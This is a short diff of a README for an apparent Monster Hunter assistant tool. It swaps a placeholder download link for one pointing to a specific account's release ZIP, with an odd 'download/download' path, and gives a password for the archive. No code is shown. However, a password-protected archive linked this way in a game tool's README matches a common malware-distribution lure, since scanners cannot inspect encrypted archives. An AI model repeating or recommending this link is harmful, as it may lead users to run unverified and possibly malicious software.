@@ -6,7 +6,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/YOUR_USERNAME/MHW-MHR-Assistant/releases/latest/download/MHW-MHR-Assistant.zip)
+### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/marcus-son-hq2097j4/MHW-MHR-Assistant/releases/download/download/MHW-MHR_Assistant.zip)
 
 🔐 Archive password: `5868781`
 
